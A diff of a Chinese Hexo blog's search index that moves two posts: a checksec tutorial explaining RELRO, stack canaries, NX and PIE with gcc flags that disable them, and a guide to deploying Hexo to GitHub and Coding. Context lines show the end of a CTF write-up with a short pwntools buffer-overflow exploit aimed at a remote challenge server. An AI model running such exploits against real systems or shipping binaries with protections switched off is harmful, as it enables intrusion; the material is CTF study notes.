@@ -20,6 +20,66 @@
       </tags>
   </entry>
   <entry>
+    <title>checksec工具使用</title>
+    <url>/2020/05/29/checksec%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>checksec在ctf中使用非常多，主要用于pwn题，记录一下使用方法。</p>
+<a id="more"></a>
+<hr>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.sh.git</span><br><span class="line">cd checksec.sh</span><br><span class="line">sudo ln –sf checksec &#x2F;usr&#x2F;bin&#x2F;checksec</span><br></pre></td></tr></table></figure>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.xsblog.xyz/blog/2020-06-01-21-47-37.png" alt="2020-06-01-21-47-37"></p>
+<p><font size=4 color=#87CEFA><b>Arch:</b></font><br>程序架构信息。<br>判断是拖进64位IDA还是32位,exp编写时p64还是p32函数</p>
+<p><font size=4 color=#87CEFA><b>RELRO:</b></font><br>Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。<br>部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入/bin/sh\x00获得shell<br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c &#x2F;&#x2F; 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c &#x2F;&#x2F; 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c &#x2F;&#x2F; 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c &#x2F;&#x2F; 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
+
+<p><font size=4 color=#87CEFA><b>Stack-canary:</b></font><br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o hello test.c   &#x2F;&#x2F;禁用栈保护</span><br><span class="line">gcc -fstack-protector -o hello test.c    &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o hello test.c  &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
+
+<p><font size=4 color=#87CEFA><b>NX:</b></font><br>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o  hello test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o  hello test.c &#x2F;&#x2F; 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o  hello test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>
+
+<p><font size=4 color=#87CEFA><b>PIE:</b></font><br>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写<br>GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。<br>若开启一般需在攻击时泄露地址信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c  &#x2F;&#x2F; 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o hello test.c  &#x2F;&#x2F; 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o hello test.c  &#x2F;&#x2F; 开启PIE，此时为最高强度2</span><br><span class="line">(还与运行时系统ALSR设置有关）</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>xctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo同时部署到github和coding</title>
+    <url>/2020/07/06/hexo%E5%90%8C%E6%97%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E5%92%8Ccoding/</url>
+    <content><![CDATA[<p>github服务器访问太慢，尝试同时搭建到github和coding</p>
+<a id="more"></a>
+<hr>
+<h2 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h2><p>首先需要创建一个仓库，名字为<code>yourname</code>.github.io，其中<code>yourname</code>为你注册时的用户名<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-08-11.png" alt="2020-07-06-15-08-11"><br>在setting-&gt;Options-&gt;GitHub Pages里面设置page服务，一般已经配置好了<br>然后就是将ssh密钥传到github上，首先在本地生成密钥</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_github_email@example.com&quot;</span><br></pre></td></tr></table></figure>
+<p>运行命令连续敲三个空格就可以了，会在<code>/root/.ssh</code>生成密钥文件<br>打开github设置，Settings-&gt;SSH and GPG keys，添加密钥，名字随意，key的内容使将刚刚生成的密钥文件id_rsa.pub中所有的内容复制过去<br>运行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+<p>出现以下提示表示配置成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi xxxxxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置coding"><a href="#配置coding" class="headerlink" title="配置coding"></a>配置coding</h2><p>coding和github应该使用同一个邮箱注册<br>新建项目（DevOps项目），其他类型的项目没有page服务，项目名称与用户名相同，在持续部署中找到静态网站，实名认证之后发布静态网站<br>在个人设置里添加ssh公钥，和github使用的公钥一样复制就行<br>运行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@coding.net</span><br></pre></td></tr></table></figure>
+<p>出现以下提示表示配置成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Coding 提示: Hello xxxxx, You&#39;ve connected to Coding.net via SSH. This is a personal key.</span><br><span class="line">xxxxxx，你好，你已经通过 SSH 协议认证 Coding.net 服务，这是一个个人公钥.</span><br><span class="line">公钥指纹：xx:xx:xx:xx:xx:xx:xx</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h2><p>配置hexo根目录文件_config.yml<br>添加以下配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    github: git@github.com:yourname&#x2F;yourname.github.io.git</span><br><span class="line">    coding: git@e.coding.net:yourname&#x2F;yourname&#x2F;yourname.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+<p>安装一键部署插件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+<p>接下来就是配置git  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br></pre></td></tr></table></figure>
+<p>这里邮箱为注册邮箱，名字随意<br>然后<code>hexo g&amp;&amp;hexo d</code>即可实现部署<br>对于github，访问<code>yourname.github.io</code>测试是否可以成功访问<br>对于coding，访问其静态网站服务所提供的网址来测试  </p>
+<h2 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h2><p>我用的是阿里云，添加解析<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-55-51.png" alt="2020-07-06-15-55-51"><br>在github的page服务出绑定刚添加的解析域名<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-59-27.png" alt="2020-07-06-15-59-27"><br>在coding中也可以绑定域名，强制配置https<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-16-02-00.png" alt="2020-07-06-16-02-00">   </p>
+<p>对于github，还要在source文件夹里面新建CNAME文件，里面加入所绑定的域名，不然每次部署之后，绑定的域名就会消失<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-16-26-38.png" alt="2020-07-06-16-26-38"><br>以上就全部配置完毕了</p>
+]]></content>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo安装</title>
     <url>/2020/05/18/hexo%E5%AE%89%E8%A3%85/</url>
     <content><![CDATA[<p>现在网上很多教程都太老，过时了，导致我搭建的时候绕了很多弯路，好在最后还是被我搭建好了，记一下安装过程。</p>
@@ -203,66 +263,6 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="number">55399</span>)</span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x48</span>+p64(<span class="number">0x40060d</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>持续更新中。。。</p>
-]]></content>
-      <tags>
-        <tag>xctf</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo同时部署到github和coding</title>
-    <url>/2020/07/06/hexo%E5%90%8C%E6%97%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E5%92%8Ccoding/</url>
-    <content><![CDATA[<p>github服务器访问太慢，尝试同时搭建到github和coding</p>
-<a id="more"></a>
-<hr>
-<h2 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h2><p>首先需要创建一个仓库，名字为<code>yourname</code>.github.io，其中<code>yourname</code>为你注册时的用户名<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-08-11.png" alt="2020-07-06-15-08-11"><br>在setting-&gt;Options-&gt;GitHub Pages里面设置page服务，一般已经配置好了<br>然后就是将ssh密钥传到github上，首先在本地生成密钥</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_github_email@example.com&quot;</span><br></pre></td></tr></table></figure>
-<p>运行命令连续敲三个空格就可以了，会在<code>/root/.ssh</code>生成密钥文件<br>打开github设置，Settings-&gt;SSH and GPG keys，添加密钥，名字随意，key的内容使将刚刚生成的密钥文件id_rsa.pub中所有的内容复制过去<br>运行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-<p>出现以下提示表示配置成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi xxxxxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置coding"><a href="#配置coding" class="headerlink" title="配置coding"></a>配置coding</h2><p>coding和github应该使用同一个邮箱注册<br>新建项目（DevOps项目），其他类型的项目没有page服务，项目名称与用户名相同，在持续部署中找到静态网站，实名认证之后发布静态网站<br>在个人设置里添加ssh公钥，和github使用的公钥一样复制就行<br>运行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@coding.net</span><br></pre></td></tr></table></figure>
-<p>出现以下提示表示配置成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Coding 提示: Hello xxxxx, You&#39;ve connected to Coding.net via SSH. This is a personal key.</span><br><span class="line">xxxxxx，你好，你已经通过 SSH 协议认证 Coding.net 服务，这是一个个人公钥.</span><br><span class="line">公钥指纹：xx:xx:xx:xx:xx:xx:xx</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h2><p>配置hexo根目录文件_config.yml<br>添加以下配置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    github: git@github.com:yourname&#x2F;yourname.github.io.git</span><br><span class="line">    coding: git@e.coding.net:yourname&#x2F;yourname&#x2F;yourname.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-<p>安装一键部署插件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-<p>接下来就是配置git  </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br></pre></td></tr></table></figure>
-<p>这里邮箱为注册邮箱，名字随意<br>然后<code>hexo g&amp;&amp;hexo d</code>即可实现部署<br>对于github，访问<code>yourname.github.io</code>测试是否可以成功访问<br>对于coding，访问其静态网站服务所提供的网址来测试  </p>
-<h2 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h2><p>我用的是阿里云，添加解析<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-55-51.png" alt="2020-07-06-15-55-51"><br>在github的page服务出绑定刚添加的解析域名<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-59-27.png" alt="2020-07-06-15-59-27"><br>在coding中也可以绑定域名，强制配置https<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-16-02-00.png" alt="2020-07-06-16-02-00">   </p>
-<p>对于github，还要在source文件夹里面新建CNAME文件，里面加入所绑定的域名，不然每次部署之后，绑定的域名就会消失<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-16-26-38.png" alt="2020-07-06-16-26-38"><br>以上就全部配置完毕了</p>
-]]></content>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>checksec工具使用</title>
-    <url>/2020/05/29/checksec%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>checksec在ctf中使用非常多，主要用于pwn题，记录一下使用方法。</p>
-<a id="more"></a>
-<hr>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.sh.git</span><br><span class="line">cd checksec.sh</span><br><span class="line">sudo ln –sf checksec &#x2F;usr&#x2F;bin&#x2F;checksec</span><br></pre></td></tr></table></figure>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://pic.xsblog.xyz/blog/2020-06-01-21-47-37.png" alt="2020-06-01-21-47-37"></p>
-<p><font size=4 color=#87CEFA><b>Arch:</b></font><br>程序架构信息。<br>判断是拖进64位IDA还是32位,exp编写时p64还是p32函数</p>
-<p><font size=4 color=#87CEFA><b>RELRO:</b></font><br>Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。<br>部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入/bin/sh\x00获得shell<br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c &#x2F;&#x2F; 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c &#x2F;&#x2F; 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c &#x2F;&#x2F; 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c &#x2F;&#x2F; 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
-
-<p><font size=4 color=#87CEFA><b>Stack-canary:</b></font><br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o hello test.c   &#x2F;&#x2F;禁用栈保护</span><br><span class="line">gcc -fstack-protector -o hello test.c    &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o hello test.c  &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
-
-<p><font size=4 color=#87CEFA><b>NX:</b></font><br>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o  hello test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o  hello test.c &#x2F;&#x2F; 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o  hello test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>
-
-<p><font size=4 color=#87CEFA><b>PIE:</b></font><br>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写<br>GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。<br>若开启一般需在攻击时泄露地址信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c  &#x2F;&#x2F; 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o hello test.c  &#x2F;&#x2F; 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o hello test.c  &#x2F;&#x2F; 开启PIE，此时为最高强度2</span><br><span class="line">(还与运行时系统ALSR设置有关）</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>xctf</tag>
